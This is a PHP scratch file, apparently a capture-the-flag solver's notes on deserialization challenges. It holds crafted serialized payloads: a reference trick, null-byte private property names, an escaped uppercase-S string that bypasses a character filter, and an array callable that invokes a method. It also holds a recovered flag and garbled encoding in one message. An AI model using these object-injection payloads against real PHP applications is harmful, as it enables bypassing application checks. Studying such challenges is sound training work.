<?php
// class xctf
// {
//     public $flag = 'user';
// }
// $a = new xctf();

////flag 3

// class funny
// {
//     public $password;
//     public $verify;
//     function __wakeup()
//     {
//     }
// };
// $b = new funny();
// $b->verify = &$b->password;

// // echo serialize($a);
// echo serialize($b);

// O:5:"funny":2:{s:15:"funny password";N;s:6:"verify";N;}
// O:5:"funny":2:{s:15:"%00funny%00password";N;s:6:"verify";R:2;}
// O:5:"funny":2:{s:8:"password";N;s:6:"verify";R:2;}


//////flag4

// class funny{
//     public $a;
//     function __destruct(){
//         global $flag;
//         echo $flag;
//     }
// }
// $b = new funny();
// echo serialize($b);
// // O:5:"funny":1:{s:1:"a";N;}


//////flag 5

// class funny{
//     private $a;
//     function __construct() {
//         $this->a = "givemeflag";
//     }
//     function __destruct() {
//         global $flag;
//         if ($this->a === "givemeflag") {
//             echo $flag;
//         }
//     }
// }

// $a = serialize(new funny() );
// echo $a;
// echo "\n";
// $b = 'O:5:"funny":1:{S:8:"\00funny\00a";s:10:"givemeflag";}';
// for($i=0;$i<strlen($b);$i++)
// {   echo ord($b[$i]),",";
//     if (ord($b[$i]) < 32 || ord($b[$i]) > 126) {
//         die("浣犲埌搴曡涓嶈鍟�");
//     }
// }

// 79,58,53,58,34,102,117,110,110,121,34,58,49,58,123,115,58,56,58,34,0,102,117,110,110,121,0,97,34,59,115,58,49,48,58,34,103,105,118,101,109,101,102,108,97,103,34,59,125,
// 79,58,53,58,34,102,117,110,110,121,34,58,49,58,123,83,58,56,58,34,92,48,48,102,117,110,110,121,92,48,48,97,34,59,115,58,49,48,58,34,103,105,118,101,109,101,102,108,97,103,34,59,125,

/////flag 6
class funny{
    public function pyflag(){
        global $flag;
        echo $flag;
    }
}

$a = new funny();
// $c = $a->pyflag();
$b = array($a,"pyflag");
echo serialize($b); 
// a:2:{i:0;O:5:"funny":0:{}i:1;s:6:"pyflag";}
// flag{Arr@y_c@11_1n5t@nc3_m3th0d}
$c= 'a:2:{i:0;s:5:"funny";i:1;s:6:"pyflag";}';
$d= unserialize($c);

echo unserialize($d);